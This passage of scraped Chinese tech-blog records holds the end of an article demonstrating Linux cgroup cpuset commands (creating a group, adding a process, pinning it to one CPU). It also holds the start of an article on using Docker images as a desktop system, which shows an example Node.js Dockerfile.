data-line=\"crayon-5a6f37af89e46737722372-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-1\"><span class=\"crayon-p\"># mkdir cgroups</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-2\"><span class=\"crayon-p\"># mount -t cgroup -o cpuset cgroups ./cgroups/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-3\"><span class=\"crayon-p\"># ls cgroups/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-4\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone_children   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_pressure_enabled</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-5\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">procs            </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_page</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-6\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sane_behavior    </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_slab</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-7\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpu_exclusive    </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mems</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-8\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpus             </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_load_balance</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-9\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_cpus   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_relax_domain_level</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-10\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_mems   </span><span class=\"crayon-e\">docker</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-11\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_exclusive    </span><span class=\"crayon-e\">tasks</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-12\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_hardwall     </span><span class=\"crayon-e\">notify_on_release</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e46737722372-13\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_migrate   </span><span class=\"crayon-e\">release_agent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e46737722372-14\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">memory_pressure</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>5. 创建一个新的组group0</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e4a661346977\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# mkdir group0\r\n# ls group0/\r\ncgroup.clone_children  cpuset.mem_exclusive       cpuset.mems\r\ncgroup.procs           cpuset.mem_hardwall        cpuset.sched_load_balance\r\ncpuset.cpu_exclusive   cpuset.memory_migrate      cpuset.sched_relax_domain_level\r\ncpuset.cpus            cpuset.memory_pressure     notify_on_release\r\ncpuset.effective_cpus  cpuset.memory_spread_page  tasks\r\ncpuset.effective_mems  cpuset.memory_spread_slab</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4a661346977-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e4a661346977-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4a661346977-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e4a661346977-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4a661346977-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e4a661346977-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4a661346977-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e4a661346977-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4a661346977-1\"><span class=\"crayon-p\"># mkdir group0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e4a661346977-2\"><span class=\"crayon-p\"># ls group0/</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4a661346977-3\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">clone_children  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_exclusive       </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mems</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e4a661346977-4\"><span class=\"crayon-v\">cgroup</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">procs           </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mem_hardwall        </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_load_balance</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4a661346977-5\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpu_exclusive   </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_migrate      </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sched_relax_domain_level</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e4a661346977-6\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">cpus            </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_pressure     </span><span class=\"crayon-e\">notify_on_release</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4a661346977-7\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_cpus  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">memory_spread_page  </span><span class=\"crayon-e\">tasks</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e4a661346977-8\"><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">effective_mems  </span><span class=\"crayon-v\">cpuset</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">memory_spread_slab</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>6. 将上面的进程20553加入到新建的控制组中：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e4f613216767\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo 20553 &gt;&gt; group0/tasks \r\n# cat group0/tasks \r\n20553</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4f613216767-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e4f613216767-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e4f613216767-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4f613216767-1\"><span class=\"crayon-p\"># echo 20553 &gt;&gt; group0/tasks </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e4f613216767-2\"><span class=\"crayon-p\"># cat group0/tasks </span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e4f613216767-3\"><span class=\"crayon-cn\">20553</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>7. 限制该组的进程只能运行在编号为2的CPU上</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e53547477228\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# echo 2 &gt; group0/cpuset.cpus\r\n# cat group0/cpuset.cpus\r\n2</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e53547477228-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e53547477228-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e53547477228-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e53547477228-1\"><span class=\"crayon-p\"># echo 2 &gt; group0/cpuset.cpus</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e53547477228-2\"><span class=\"crayon-p\"># cat group0/cpuset.cpus</span></div><div class=\"crayon-line\" id=\"crayon-5a6f37af89e53547477228-3\"><span class=\"crayon-cn\">2</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>8. 查看PID为20553的进程所运行的CPU编号</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af89e56145120860\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep\r\nroot     20553   2 bash run.sh</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af89e56145120860-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af89e56145120860-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af89e56145120860-1\"><span class=\"crayon-p\"># ps -eLo ruser,lwp,psr,args | grep 20553 | grep -v grep</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af89e56145120860-2\"><span class=\"crayon-i\">root</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">20553</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">bash </span><span class=\"crayon-v\">run</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sh</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>上面的例子简单的展示了如何使用控制组。控制组通过文件和目录来操作，文件系统又是树形结构，因此如果不对cgroups的使用做一些限制的话，配置会变得异常复杂和混乱。因此，在新版的cgroups中做了一些限制。</p>\n<h1>小结</h1>\n<p>本文简要介绍了操作系统虚拟化的概念，以及实现操作系统虚拟化的技术——命名空间及控制组。并通过两个简单的例子演示了命名空间及控制组的使用方法。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113459\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113459votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113459\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/01/382b1251c2cdb32cf334445596f97085.png"], "title": "把docker镜像当作桌面系统来用", "fav_nums": 3, "url": "http://blog.jobbole.com/113448/", "create_date": "2018/01/08", "url_object_id": "7b88426617fb1d20ba1260658b57c9c2", "comment_nums": 0, "front_image_path": "full/67490ccebef720732b63d9ddb9e17fb0a590e30a.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://zasdfgbnm.github.io/2017/12/28/%E6%8A%8Adocker%E9%95%9C%E5%83%8F%E5%BD%93%E4%BD%9C%E6%A1%8C%E9%9D%A2%E7%B3%BB%E7%BB%9F%E6%9D%A5%E7%94%A8/\">zasdfgbnm</a>   </div><div>\n<p>博主一直都很喜欢思考怎样管理装在自己电脑上的桌面系统，这篇算是前作<a href=\"http://blog.jobbole.com/111672/\">能当主力，能入虚拟机，还能随时打包带走，Linux就是这么强大</a>的后续探索吧。</p>\n<p>近些年来，Docker由于提供了一套非常方便地创建并运行应用容器的方法，而在全球掀起了一股容器化的热潮。容器通过将软件及其所需要的运行环境一同打包带走，从而将人们从依赖的苦海中拯救出来。虽然Docker设计的初衷并不是操作系统容器，更不是一个直接运行在裸机上的操作系统，但是docker这套强大的工具也会给我们管理操作系统带来巨大的便利。</p>\n<p>为什么要用Docker镜像当作桌面系统？这就要从普通桌面系统的不方便之处说起。通常我们都拥有不止一台电脑，我们希望这些电脑能够保持一致。这里所说的“一致”，用一个例子来讲，就是我在一台电脑上编辑了一半的文件，不需要认为拷贝到另一台电脑上，而是直接打开电脑就能编辑。如果这个文件只是一个纯文本文件，或者一个Microsoft Word文档，那么实现这个一致性非常简单：把文件扔到Dropbox之类的云同步盘就好。然而对于专业用户来讲，这种一致性的保持并非单纯的扔到Dropbox里面那么简单：比如说你最近忙于一个项目，这个项目要用到若干编程语言，然后在电脑里装了一堆库，一堆工具软件，有图形界面的，也有命令行的。在工作的过程中，你有可能不断安装新的工具，或者决定弃用某个之前计划使用的库或者工具。要让你的工作在你的若干台电脑上都能工作，就要一直维护不同机器的环境的一致性：在一台机器上安装的工具，要在所有机器上重新安装一遍。在一台机器上升级了的库，要在所有机器上都升级，稍微有所差池，就有可能出现某个脚本/程序在一台机器上跑的好好的，在另一台机器上却无法运行的问题。</p>\n<h1 id=\"docker哲学\">docker哲学</h1>\n<p>不熟悉docker的读者可以戳<a href=\"https://docs.docker.com/get-started/\" target=\"_blank\" rel=\"noopener\">这里</a>来了解docker。Docker的使用非常简单：我们通过写一个Dockerfile，在Dockerfile中写入相应的命令来安装以及配置我们想要的库跟工具。不熟悉docker的读者可以看一下下面这个<a href=\"https://github.com/kstaken/dockerfile-examples/blob/master/nodejs/Dockerfile\" target=\"_blank\" rel=\"noopener\">抄来的Dockerfile的例子</a>，来了解一下Dockerfile长啥样子：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f2a1eb33c7393815678\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nFROM ubuntu\r\nMAINTAINER Kimbro Staken\r\nRUN apt-get install -y software-properties-common python\r\nRUN add-apt-repository ppa:chris-lea/node.js\r\nRUN echo \"deb http://us.archive.ubuntu.com/ubuntu/ precise universe\" &gt;&gt; /etc/apt/sources.list\r\nRUN apt-get update\r\nRUN apt-get install -y nodejs\r\n#RUN apt-get install -y nodejs=0.6.12~dfsg1-1ubuntu1\r\nRUN mkdir /var/www\r\nADD app.js /var/www/app.js\r\nCMD [\"/usr/bin/node\", \"/var/www/app.js\"]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f2a1eb33c7393815678-11\">11</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-1\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-e\">ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f2a1eb33c7393815678-2\"><span class=\"crayon-e\">MAINTAINER </span><span class=\"crayon-e\">Kimbro </span><span class=\"crayon-e\">Staken</span></div><div class=\"crayon-line\" id=\"crayon-5a6f2a1eb33c7393815678-3\"><span class=\"crayon-e\">RUN </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">y</span><span class=\"crayon-h\"> </span><span 